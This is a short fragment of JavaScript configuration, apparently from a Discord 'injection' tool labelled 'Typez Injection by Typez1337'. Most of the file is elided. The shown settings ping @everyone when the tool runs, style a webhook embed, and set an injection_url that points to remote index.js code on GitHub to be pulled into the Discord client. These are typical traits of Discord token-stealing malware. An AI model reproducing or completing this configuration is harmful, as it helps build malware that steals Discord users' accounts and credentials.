...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'Typez Injection', 
  embed_icon: 'https://i.postimg.cc/RVfpMRkz/xd.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/ChildsOfYhwh/injection/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Typez1337 ',
        },
      },
    ],
  };
